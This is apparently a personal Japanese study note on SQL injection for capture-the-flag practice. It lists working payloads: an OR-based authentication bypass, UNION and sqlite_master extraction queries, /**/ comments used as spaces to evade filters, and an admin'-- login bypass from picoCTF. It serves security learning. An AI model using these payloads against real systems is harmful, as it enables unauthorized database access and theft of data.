# SQL Injection

https://github.com/swisskyrepo/PayloadsAllTheThings  
なんかすごいのあった

## 俯瞰

- SQLi(=SQL injection)
  - [チートシート](http://www.byakuya-shobo.co.jp/hj/moh/sqlinjectioncheatsheet.html)
- Blind SQLi
  - 【基本】 https://graneed.hatenablog.com/entry/2019/10/13/214515

- PostgreSQL
  - `' OR 1 --`

- MySQL
  - `#`が使えたらMySQLだし、そうでなければそれ以外（PostgresSQL, SQLite)
  - `inforrmation_schema.columns`でカラム情報を抜ける' || (SELECT group_concat(sql) FROM sqlite_master) || '
- UNIONによる結合で情報を抜く
  - `UNION SELECT null,flag FROM flag`みたいにやるが、カラムが使えないときは、JOINを使うこともある [参考](http://zoczus.blogspot.com/2013/03/sql-injection-without-comma-char.html)

- SQLite
  - テーブル情報を全て抜き出す
    - `SELECT group_concat(sql) FROM sqlite_master`とすると、カンマで結合されて1レコードで出てくる [出典](https://qiita.com/kusano_k/items/0e9d29ee9f6bda614a1d#empire1---points-400---solves-499---web-exploitation)
    - `SELECT sql FROM sqlite_master`と書くと全部バラバラに出てくる

- Space2Comment
	- /**/を使うと空白として扱われれる

* 問題
- [https://ctftime.org/task/7075:title=RITSEC CTF 2018 Space Force] 「'=''or'」、「'/**/union/**/select/**/*/**/from/**/spaceships#」、「'=''#」





## 対策回避方法

- フィルタしている場合
  - ユーザ名：パスワードの組で指定する時に、ユーザ名で`admin'--`としてしまう [手法出典](http://www.byakuya-shobo.co.jp/hj/moh/sqlinjectioncheatsheet.html) 問題：picoCTF2019 Irish-Name-Repo 2
  

